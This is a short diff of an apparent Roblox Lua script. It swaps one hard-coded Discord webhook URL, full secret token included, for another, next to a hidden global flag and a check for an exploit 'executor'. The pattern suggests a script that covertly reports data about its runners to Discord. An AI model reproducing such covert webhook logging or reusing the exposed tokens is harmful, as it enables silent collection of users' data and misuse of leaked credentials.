@@ -5,7 +5,7 @@ task.spawn(function()
 	_G.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA = true
 	local HttpService = game:GetService("HttpService")
 	
-	local url = "https://discord.com/api/webhooks/1340013385760247910/VjtlzhcOt2AkdHMR4Q_rJppeGUFOA0lOK3yI81UEYLuBpS_4qsu1JtmogJ52_3WcIuhD"
+	local url = "https://discord.com/api/webhooks/1340398526651301972/qfSeMZzBpov8jhCbtwY0whFs_avCHq355HbTulpOwwMo4ay3F54U4mDIaIObd-187SOo"
 
 	local executor = nil
 
